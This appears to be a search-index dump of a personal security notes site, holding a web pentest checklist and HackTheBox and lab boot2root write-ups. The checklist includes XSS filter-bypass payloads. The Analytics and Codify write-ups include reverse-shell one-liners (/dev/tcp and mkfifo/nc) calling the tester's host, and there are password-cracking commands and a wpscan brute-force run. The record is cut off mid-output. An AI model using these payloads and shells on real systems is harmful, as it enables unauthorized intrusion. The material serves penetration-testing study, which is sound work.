</li> <li> <p>Weak or missing public key pinning: Implement HTTP Public Key Pinning (HPKP) or Certificate Transparency to enforce the use of specific public keys and reduce the risk of man-in-the-middle attacks.</p> </li> <li> <p>Mixed content: Ensure that all content, including images, stylesheets, and scripts, are served over HTTPS to prevent mixed content warnings and potential attacks.</p> </li> <li> <p>Insecure renegotiation: Disable insecure client-initiated renegotiation to protect your site from man-in-the-middle attacks exploiting this vulnerability.</p> </li> <li> <p>Insufficient forward secrecy: Use cipher suites that support forward secrecy, such as ECDHE or DHE, to protect past communications from being decrypted even if the server's private key is compromised.</p> </li> <li> <p>Lack of OCSP stapling: Implement OCSP (Online Certificate Status Protocol) stapling to reduce the latency of SSL/TLS handshakes and provide real-time certificate revocation information.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#file-upload","title":"File Upload","text":"<ul> <li> <p>File size limit: Verify that there is an appropriate file size limit in place to prevent large file uploads that could potentially exhaust server resources.</p> </li> <li> <p>File type restrictions: Ensure that only allowed file types can be uploaded, and test with disallowed file types to confirm the restrictions are working.</p> </li> <li> <p>MIME type validation: Check that the MIME type of uploaded files is being validated and that the system rejects files with incorrect MIME types.</p> </li> <li> <p>Filename validation: Test that the system filters and sanitizes filenames to avoid malicious filenames (e.g., \"../\", \".htaccess\") that could lead to security vulnerabilities.</p> </li> <li> <p>Malware scanning: Scan uploaded files for malware or viruses using an up-to-date antivirus solution.</p> </li> <li> <p>Duplicate file names: Test how the system handles duplicate file names, ensuring that it doesn't overwrite existing files or create security vulnerabilities.</p> </li> <li> <p>Upload directory: Verify that the upload directory is secured and not accessible for unauthorized users.</p> </li> <li> <p>Permissions: Ensure that proper file and folder permissions are set to prevent unauthorized access, modification, or deletion of uploaded files.</p> </li> <li> <p>User authentication: Test if file uploads require proper user authentication and that unauthorized users cannot upload files.</p> </li> <li> <p>Image validation: If uploading images, test for potential vulnerabilities related to image processing libraries (e.g., buffer overflows, code injection).</p> </li> <li> <p>File content validation: Ensure that the content of the files is validated and doesn't contain malicious code or scripts.</p> </li> <li> <p>Maximum file uploads: Test the maximum number of simultaneous file uploads to ensure the system can handle the load without crashing or compromising security.</p> </li> <li> <p>Timeouts: Test the system for handling long uploads and confirm that it has appropriate timeouts in place.</p> </li> <li> <p>Rate limiting: Verify that the system has rate limiting in place to prevent abuse and denial of service (DoS) attacks.</p> </li> <li> <p>Error handling: Test the system's error handling capabilities to ensure that it doesn't leak sensitive information or create security vulnerabilities.</p> </li> <li> <p>Cross-site scripting (XSS): Test for potential XSS vulnerabilities related to file uploads, such as the inclusion of malicious scripts within file metadata.</p> </li> <li> <p>Path traversal: Test for path traversal vulnerabilities by attempting to upload files with directory traversal characters (e.g., \"../\") in the file name.</p> </li> <li> <p>SQL injection: Test for potential SQL injection vulnerabilities related to file uploads, such as manipulating metadata to include malicious SQL queries.</p> </li> <li> <p>Access control: Verify that proper access controls are in place for viewing, editing, or deleting uploaded files.</p> </li> <li> <p>Logging and monitoring: Ensure that the system logs and monitors all file upload activities for potential security threats and suspicious behavior.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#xss","title":"XSS","text":"<ul> <li> <p>Basic payload injection: Inject simple script tags or HTML tags with JavaScript event handlers into input fields or query parameters. Example: <code>&lt;script&gt;alert(10)&lt;/script&gt; or &lt;img src=x onerror=alert(1)&gt;</code>.</p> </li> <li> <p>URL encoding: Use URL-encoded payloads to bypass input filters that may block certain characters. Example: <code>%3Cscript%3Ealert(1)%3C%2Fscript%3E</code>.</p> </li> <li> <p>Hex encoding: Test with hex-encoded payloads to bypass filters that block specific characters. Example: <code>&lt;scr\\x69pt&gt;alert(1)&lt;/scr\\x69pt&gt;</code>.</p> </li> <li> <p>Case variation: Try different letter casing to bypass case-sensitive filters. Example: <code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code>.</p> </li> <li> <p>HTML entity encoding: Inject payloads with HTML entities to evade filters that remove or escape specific characters. Example: <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>.</p> </li> <li> <p>Null byte injection: Use null bytes to break out of input restrictions or bypass filters. Example: <code>&lt;scr%00ipt&gt;alert(1)&lt;/scr%00ipt&gt;</code>.</p> </li> <li> <p>Double encoding: Test with double-encoded payloads to bypass filters that only decode input once. Example: <code>%253Cscript%253Ealert(1)%253C%252Fscript%253E</code>.</p> </li> <li> <p>Attribute injection: Attempt to inject payloads within existing HTML tags by closing the current attribute and adding a new one with malicious JavaScript. Example: <code>\"&gt;&lt;img src=x onerror=alert(1)&gt;</code>.</p> </li> <li> <p>JavaScript event handlers: Inject JavaScript event handlers, such as onmouseover, onfocus, or onclick, into various HTML elements to trigger the payload.</p> </li> <li> <p>Malformed tags: Test with malformed tags to bypass filters that look for well-formed HTML. Example: <code>&lt;scrip&lt;script&gt;t&gt;alert(1)&lt;/scrip&lt;/script&gt;t&gt;</code>.</p> </li> <li> <p>Using different contexts: Test payloads in various contexts, such as HTML comments, inline JavaScript, or CSS, to bypass context-specific filters.</p> </li> <li> <p>Data URI: Inject data URI payloads to bypass certain input filters. Example: <code>&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt;&lt;/iframe&gt;</code>.</p> </li> <li> <p>SVG payloads: Use Scalable Vector Graphics (SVG) payloads to execute JavaScript in a different context. Example: <code>&lt;svg onload=\"alert(1)\"&gt;&lt;/svg&gt;</code>.</p> </li> <li> <p>Breaking out of JavaScript: Inject payloads that break out of existing JavaScript code and execute malicious scripts.</p> </li> <li> <p>Testing error pages: Check if error pages, such as 404 or 500, reflect user input without proper encoding, as these can be used for reflected XSS attacks.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#xxe","title":"XXE","text":"<ul> <li> <p>Basic external entity: Inject a basic external entity reference to test if the parser resolves it</p> </li> <li> <p>External parameter entity: Inject an external parameter entity to bypass input filters. </p> </li> <li> <p>Blind XXE (OOB technique): Use Out-of-Band (OOB) techniques to exfiltrate data if the response doesn't display the content of the external entity.</p> </li> <li> <p>File inclusion: Attempt to include local or remote files using the SYSTEM identifier to test for arbitrary file inclusion.</p> </li> <li> <p>Internal entity expansion: Inject an internal entity with a large number of nested entities to test for a Billion Laughs attack (a type of denial-of-service attack).</p> </li> <li> <p>Recursive entity references: Test for recursive entity expansion to identify potential denial-of-service (DoS) vulnerabilities.</p> </li> <li> <p>XML bomb: Inject a large XML file with deeply nested elements to test for XML bomb vulnerabilities, which can lead to DoS attacks.</p> </li> <li> <p>Error-based XXE: Inject malformed XML with external entity references to trigger errors that reveal sensitive information.</p> </li> <li> <p>XML encoding: Try different XML encodings (e.g., UTF-16, UTF-32) to bypass input filters that block specific characters.</p> </li> <li> <p>Use CDATA sections: Inject external entity references inside CDATA sections to bypass input filters that remove or escape specific characters.</p> </li> <li> <p>Custom entities: Create custom entities with external references to test if the XML parser resolves them.</p> </li> <li> <p>Test various content types: Test for XXE vulnerabilities in different content types that support XML, such as SOAP, XHTML, SVG, or RSS.</p> </li> <li> <p>Test XML-based file formats: Test for XXE vulnerabilities in XML-based file formats, such as Office Open XML (.docx, .pptx, .xlsx) or OpenDocument (.odt, .ods, .odp).</p> </li> <li> <p>Test different HTTP methods: Test for XXE vulnerabilities using different HTTP methods, such as POST, PUT, or PATCH, with XML payloads.</p> </li> <li> <p>Test XML-based APIs: Test for XXE vulnerabilities in XML-based APIs, such as XML-RPC or SOAP-based web services.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#idor","title":"IDOR","text":"<ul> <li> <p>Sequential IDs: Analyze sequential numeric IDs or predictable identifiers in URLs, API endpoints, or hidden form fields, and try modifying them to access unauthorized resources.</p> </li> <li> <p>User-specific data: Ensure proper authorization checks are in place for user-specific data, such as profiles, orders, or messages, by attempting to access another user's data using your authenticated session.</p> </li> <li> <p>Enumerate identifiers: Create multiple accounts with different roles (e.g., admin, user) and compare the object identifiers to identify patterns or correlations.</p> </li> <li> <p>Test file uploads: Test file upload functionality and attempt to access uploaded files by guessing or modifying their filenames.</p> </li> <li> <p>Test API endpoints: Analyze API endpoints for exposed object references and attempt to access unauthorized resources by modifying request parameters.</p> </li> <li> <p>Test hidden form fields: Examine hidden form fields for object references and modify their values to access unauthorized resources.</p> </li> <li> <p>Test JSON or XML responses: Analyze JSON or XML responses for exposed object references and attempt to access unauthorized resources by modifying request parameters.</p> </li> <li> <p>Test related features: Test related features or modules, such as password reset or email validation, for IDOR vulnerabilities by modifying request parameters.</p> </li> <li> <p>Test with different roles: Create accounts with different roles (e.g., admin, user, guest) and attempt to access unauthorized resources using different user sessions.</p> </li> <li> <p>Test with unauthenticated sessions: Test if unauthenticated users can access resources by modifying object references in URLs or API endpoints.</p> </li> <li> <p>Use web application scanners: Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential IDOR vulnerabilities.</p> </li> <li> <p>Analyze access logs: Review server access logs for patterns indicating unauthorized access attempts.</p> </li> <li> <p>Manipulate cookies: Manipulate cookies or session tokens to impersonate other users and attempt to access unauthorized resources.</p> </li> <li> <p>Test request methods: Test for IDOR vulnerabilities using different HTTP request methods, such as GET, POST, PUT, DELETE, or PATCH.</p> </li> <li> <p>Test with URL-encoded or base64-encoded parameters: Try URL-encoded or base64-encoded parameters to bypass input validation or access control checks.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#subdomain-takeover","title":"Subdomain Takeover","text":"<ul> <li> <p>Enumerate subdomains: Use tools like Sublist3r, Amass, or dnsrecon to discover subdomains associated with your main domain.</p> </li> <li> <p>Analyze DNS records: Check DNS records (e.g., CNAME, A, AAAA, MX) for subdomains pointing to external services or expired domains.</p> </li> <li> <p>Check HTTP responses: Examine HTTP responses for error messages or status codes that may indicate an unclaimed or expired external service.</p> </li> <li> <p>Use online services: Utilize online services such as crt.sh or Censys to gather subdomain and certificate data for your main domain.</p> </li> <li> <p>Test common third-party services: Check if subdomains are pointing to common third-party services, such as AWS S3, GitHub Pages, or Heroku, that are susceptible to subdomain takeover attacks.</p> </li> <li> <p>Test for dangling CNAME records: Look for dangling CNAME records that point to external services that have been deleted or expired.</p> </li> <li> <p>Monitor domain registration: Monitor domain registration information for expired domains that can be taken over.</p> </li> <li> <p>Use subdomain takeover tools: Utilize tools like SubOver, Subjack, or tko-subs to automatically identify subdomain takeover vulnerabilities.</p> </li> <li> <p>Check for misconfigured DNS settings: Examine DNS settings for misconfigurations that might lead to subdomain takeover vulnerabilities.</p> </li> <li> <p>Test for wildcard DNS records: Check for wildcard DNS records that might expose subdomains to takeover attacks.</p> </li> <li> <p>Check for abandoned subdomains: Look for abandoned subdomains that still point to unused external services.</p> </li> <li> <p>Test for improper redirects: Check if subdomains are improperly redirecting traffic to external services that can be taken over.</p> </li> <li> <p>Monitor domain ownership changes: Monitor domain ownership changes for potential takeover opportunities.</p> </li> <li> <p>Collaborate with third-party service providers: Work with third-party service providers to ensure proper domain configuration and prevent subdomain takeover.</p> </li> <li> <p>Regularly audit subdomain configurations: Periodically review your subdomain configurations to identify and mitigate potential subdomain takeover risks.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#wordpress-cms","title":"Wordpress CMS","text":"<ul> <li> <p>Keep WordPress updated: Regularly update the WordPress core, plugins, and themes to protect against known vulnerabilities.</p> </li> <li> <p>Test for weak passwords: Ensure strong passwords are used for all user accounts, especially for administrator accounts.</p> </li> <li> <p>Check for user enumeration: Test if usernames can be enumerated through the WordPress author archives or other means, and disable user enumeration if possible.</p> </li> <li> <p>Test for default admin username: Ensure the default \"admin\" username is not used, and replace it with a custom username.</p> </li> <li> <p>Limit login attempts: Test if login attempts are limited to prevent brute-force attacks, and install a plugin like Login LockDown or Wordfence to enable this functionality if necessary.</p> </li> <li> <p>Test for insecure file permissions: Check the permissions of your WordPress files and folders to ensure they are secure and cannot be accessed by unauthorized users.</p> </li> <li> <p>Test for XML-RPC vulnerabilities: Test for vulnerabilities related to the XML-RPC feature, such as DDoS or brute-force attacks, and disable it if not needed.</p> </li> <li> <p>Test for SQL injection vulnerabilities: Test your WordPress site for SQL injection vulnerabilities by injecting SQL payloads into input fields or URL parameters.</p> </li> <li> <p>Test for Cross-Site Scripting (XSS) vulnerabilities: Test your WordPress site for XSS vulnerabilities by injecting JavaScript payloads into input fields or URL parameters.</p> </li> <li> <p>Test for Cross-Site Request Forgery (CSRF) vulnerabilities: Test your WordPress site for CSRF vulnerabilities by attempting to perform actions without a valid CSRF token or by using another user's authenticated session.</p> </li> <li> <p>Test for vulnerable plugins: Check for known vulnerabilities in your installed plugins using tools like WPScan or by regularly monitoring vulnerability databases.</p> </li> <li> <p>Test for vulnerable themes: Check for known vulnerabilities in your installed themes using tools like WPScan or by regularly monitoring vulnerability databases.</p> </li> <li> <p>Test for insecure configurations: Check your WordPress configuration (wp-config.php) for insecure settings, such as displaying errors, and secure it by disabling features like error reporting or file editing.</p> </li> <li> <p>Check for security best practices: Ensure your site follows WordPress security best practices, such as using HTTPS, disabling directory browsing, or setting secure HTTP headers.</p> </li> <li> <p>Use a security plugin: Install a comprehensive security plugin like Wordfence, iThemes Security, or Sucuri to monitor and protect your site from various threats.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"writeup/hackthebox/machines/easy/analytics/","title":"Analytics","text":"","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#reconnaissance","title":"Reconnaissance","text":"<ul> <li>nmap</li> <li>nano /etc/hosts (analytics.htb) (data.analytical.htb)</li> </ul>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#enumeration","title":"Enumeration","text":"<p>open burpsuite atau just direct ke web untuk dapatkan setup-token takde fuzzing, direct public exploit</p>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#exploitation","title":"Exploitation","text":"<ul> <li>metabase vulnerable (https://github.com/shamo0/CVE-2023-38646-PoC) https://github.com/securezeron/CVE-2023-38646 https://github.com/m3m0o/metabase-pre-auth-rce-poc   https://medium.com/@starlox.riju123/hackthebox-analytics-metabase-rce-bd3421cba76d </li> </ul> <p>listening - rlwrap -lnvp 1234 exploit command - <code>python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c \"bash -i &gt;&amp; /dev/tcp/10.10.16.14/1234 0&gt;&amp;1\"</code></p> <ul> <li>run linpeas</li> </ul> <p>META_PASS=An4lytics_ds20223# META_USER=metalytics</p> <p>dapat user.txt</p>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/analytics/#privesc","title":"Privesc","text":"<ul> <li>run linpeas balik sbb dah tukar user. tadi www-data user</li> <li>check ubuntu version, kernel version</li> <li>search exploit dekat internet (https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)</li> <li>send file (tengok hacktools)</li> <li>run dapat root.txt</li> </ul>","tags":["gobuster","cve","linpeas"]},{"location":"writeup/hackthebox/machines/easy/codify/","title":"Codify","text":"","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#recon","title":"Recon","text":"<p>nmap scan if have smb or any kind of port service. use enum4linux</p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#enumeration","title":"Enumeration","text":"<p>see what is happen on the web. make some reading. find vm2 exploit https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/ <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.9 1234 &gt;/tmp/f</code></p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#exploitation","title":"Exploitation","text":"<p>cari something interesting found seomthing on /var/www/contact/tickets.db joshua\\(2a\\)12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2 search dulu what type is this hash <code>hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt -w 3</code> <code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></p> <p>got user.txt</p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/easy/codify/#privesc","title":"Privesc","text":"<p>direct sudo -l baca script /opt/scripts/mysql-backup.sh tanya chatgpt.. try to understand and listen how it works guna pspy64 <code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64</code></p> <p>then transfer pass.py atau password.py run got root.txt</p>","tags":["enum4linux","cve","john","hashcat","linpeas","pspy64"]},{"location":"writeup/hackthebox/machines/hard/drive/","title":"- Drive","text":""},{"location":"writeup/hackthebox/machines/hard/drive/#reconnaissance","title":"Reconnaissance","text":""},{"location":"writeup/hackthebox/machines/medium/visual/","title":"- Visual","text":""},{"location":"writeup/hackthebox/machines/medium/visual/#reconnaissance","title":"Reconnaissance","text":""},{"location":"writeup/random/butane/","title":"Butane","text":"<p>Here is a challenge on Butane, Boot2Root machine.</p>","tags":["udp","snmpwalk","linpeas","lse","pnwkit"]},{"location":"writeup/random/butane/#reconnaissance","title":"Reconnaissance","text":"<p><code>IP = 192.168.8.131</code></p> <p>First and foremost, doing nmap scan to gather information of the machine. We get this</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/butane]\n\u2514\u2500# nmap -p- --min-rate 10000 192.168.8.131 \nStarting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 03:36 EDT\nNmap scan report for butane.netbytesec.com (192.168.8.131)\nHost is up (0.0011s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 13.42 seconds\n</code></pre> <p>There is only one service running. I thought that the machine is not running correctly haha. So just relax... </p> <p>After a while, there is a hint said that \"Why not trying the UDP\". So bump into nmap UDP scan. It took some time, so we give <code>-vv</code> to make it more aggressive. </p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/butane]\n\u2514\u2500# nmap -sU -T4 -vv 192.168.8.131\n</code></pre> <p>Output</p> <pre><code>Scanned at 2023-10-27 00:17:08 EDT for 1579s\nNot shown: 999 open|filtered udp ports (no-response)\nPORT    STATE SERVICE REASON\n161/udp open  snmp    udp-response ttl 128\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 1578.88 seconds\n           Raw packets sent: 2279 (106.097KB) | Rcvd: 2 (181B)\n</code></pre>","tags":["udp","snmpwalk","linpeas","lse","pnwkit"]},{"location":"writeup/random/butane/#enumeration","title":"Enumeration","text":"<p>It is snmp service running on this machine. So we go thru the SNMP hacktricks https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/butane]\n\u2514\u2500# snmpwalk -v 2c -c public 192.168.8.131 .1 &gt; output.txt\n</code></pre> <p>We will be using this command to enumerate and get the machine information. We get this and there is credentials of <code>mike:P@55w0Rd</code> to log in into the SSH and the first flag.</p> <p></p>","tags":["udp","snmpwalk","linpeas","lse","pnwkit"]},{"location":"writeup/random/butane/#exploitation","title":"Exploitation","text":"<p>We go into the SSH. Directly we got the second flag</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/butane]\n\u2514\u2500# ssh mike@192.168.8.131                \nmike@192.168.8.131's password: \nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n279 packages can be updated.\n197 updates are security updates.\n\nNew release '18.04.6 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\n\nLast login: Fri Oct 27 12:46:19 2023 from 192.168.22.12\nmike@butane:~$ ls\nflag2.txt\nmike@butane:~$ cat flag2.txt\nflag{37503d2ac009c25f88f86a4961be83d0944afcd6}\n</code></pre>","tags":["udp","snmpwalk","linpeas","lse","pnwkit"]},{"location":"writeup/random/butane/#privesc","title":"Privesc","text":"<p>To get the root I try to look on the <code>linpeas</code> and directly install into the machine because there is <code>wget</code></p> <pre><code>mike@butane:/tmp$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n</code></pre> <p>After a few testing of privesc OS and Linux kernel. It was mission failed because there is no <code>gcc</code> install</p> <pre><code>                              \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 System Information \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n                              \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Operative system\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits\nLinux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017\nDistributor ID: Ubuntu\nDescription:    Ubuntu 16.04.2 LTS\nRelease:    16.04\nCodename:   xenial\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sudo version\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version\nSudo version 1.8.16\n</code></pre> <p>After trying some exploit on the public, we cannot get thru anything</p>","tags":["udp","snmpwalk","linpeas","lse","pnwkit"]},{"location":"writeup/random/hidrogen/","title":"Hidrogen","text":"<p>So today we will be doing a challenge on Hidrogen Boot2Root machine. For this machine, it is about a wordpress CMS exploitation and privesc of root using <code>/usr/bin/man</code>. Let's dig in.</p> <p></p>","tags":["ftp","wpscan","rce","linpeas","gtfobins","mysql"]},{"location":"writeup/random/hidrogen/#reconnaissance","title":"Reconnaissance","text":"<p><code>IP = 192.168.8.118</code></p> <p>Access the website and we get this. It said to state the domain name. So we write it in <code>/etc/hosts</code> and give a random name </p> <p></p> <p><code>192.168.8.118   hidrogen.netbytesec.com</code></p> <p></p> <p>We got nothing in here, so we will do <code>nmap</code> scan in hopes we get something interesting to look on.</p> <p>We can see here there is <code>/robots.txt</code> on the port 80 and the directory to <code>/phpmyadmin</code> login page that maybe some database service is running on the web server. </p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/hidrogen]\n\u2514\u2500# nmap -sCV -A 192.168.8.118 -o nmap/scan.txt\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 01:29 EDT\nNmap scan report for hydrogen.co (192.168.8.118)\nHost is up (0.00092s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp?\n22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)\n| ssh-hostkey: \n|   1024 24:04:bf:3c:02:c8:ac:cd:5e:41:e8:5e:c8:47:96:76 (DSA)\n|   2048 28:fd:24:7b:a5:9a:b6:62:ad:d6:3f:b0:4e:7e:ea:e9 (RSA)\n|_  256 eb:b8:37:33:af:eb:a2:a7:4a:84:27:6e:35:65:d4:a6 (ECDSA)\n80/tcp open  http    nginx 1.2.1\n|_http-title: Hydrogen Co\n|_http-server-header: nginx/1.2.1\n| http-robots.txt: 1 disallowed entry \n|_/phpmyadmin\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: WAP|general purpose\nRunning: Actiontec embedded, Linux 2.4.X\nOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37\nOS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT     ADDRESS\n1   0.09 ms 192.168.37.2\n2   0.11 ms hydrogen.co (192.168.8.118)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 271.18 seconds\n</code></pre> <p>On the other hand, one more interesting port that is open which is FTP port 21. How about we try to login into it by using default login <code>anonymous:anonymous</code>. </p>","tags":["ftp","wpscan","rce","linpeas","gtfobins","mysql"]},{"location":"writeup/random/hidrogen/#enumeration","title":"Enumeration","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/hidrogen]\n\u2514\u2500# ftp hidrogen.netbytesec.com\nConnected to hidrogen.netbytesec.com.\n220 ProFTPD 1.2.6 Server (Hydrogen Corporation File Transfer Service) [hydrogrencorp]\nName (hidrogen.netbytesec.com:kali): anonymous\n331 Anonymous login ok, send your complete email address as your password.\nPassword: \n230 Anonymous access granted, restrictions apply.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; ls -la\n227 Entering Passive Mode (192,168,8,118,161,169).\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   2 ftp      ftp          4096 Feb 19  2019 .\ndrwxr-xr-x   2 ftp      ftp          4096 Feb 19  2019 ..\n-rw-r--r--   1 ftp      ftp           472 Jan 19  2019 email.txt\n-r--------   1 ftp      ftp            39 Jan 18  2019 flag1.txt\n226 Transfer complete.\n</code></pre> <p>Walla. There is flag1.txt in this FTP service. We can use <code>get</code> command to take this file and we get the first flag.</p> <p><code>flag{a173c6cb236d6fe768ad94a6df400874}</code></p> <p>Look into the <code>email.txt</code> file and we can see <code>john@hydrogen.co</code></p> <p></p> <p>Change the domain name first to <code>hydrogen.co</code>. Something interesting here, there is <code>/wordpress</code> directory. </p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/hidrogen]\n\u2514\u2500# dirb http://hydrogen.co            \n\n-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Wed Oct 18 03:16:58 2023\nURL_BASE: http://hydrogen.co/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612                                                          \n\n---- Scanning URL: http://hydrogen.co/ ----\n==&gt; DIRECTORY: http://hydrogen.co/css/                                            \n==&gt; DIRECTORY: http://hydrogen.co/img/                                            \n+ http://hydrogen.co/index.html (CODE:200|SIZE:5033)                              \n+ http://hydrogen.co/info.php (CODE:200|SIZE:49727)                               \n==&gt; DIRECTORY: http://hydrogen.co/phpmyadmin/                                     \n+ http://hydrogen.co/robots.txt (CODE:200|SIZE:36)                                \n==&gt; DIRECTORY: http://hydrogen.co/vendor/                                         \n==&gt; DIRECTORY: http://hydrogen.co/wordpress/ \n</code></pre> <p>We find something on this site, there is <code>http://hydrogen.co/wordpress/wp-login.php</code></p> <p></p> <p>First and foremost if there is WordPress, we will use tools like <code>wpscan</code> to enumerate the login page by following this absolute powerful website here</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/kali/Desktop/internship/hidrogen]\n\u2514\u2500# wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://hydrogen.co/wordpress/ --wp-content-dir wp-login.php --scope url --detection-mode aggressive --enumerate p --api-token xxxxxNeeMLfPeguxxxxxnlHYD4o70xxxxxx --passwords /opt/tools/SecLists/Passwords/probable-v2-top1575.txt\n</code></pre> <p>The output:</p> <pre><code>_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.25\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://hydrogen.co/wordpress/ [192.168.8.118]\n[+] Started: Wed Oct 18 03:33:11 2023\n\nInteresting Finding(s):\n\n[+] XML-RPC seems to be enabled: http://hydrogen.co/wordpress/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme 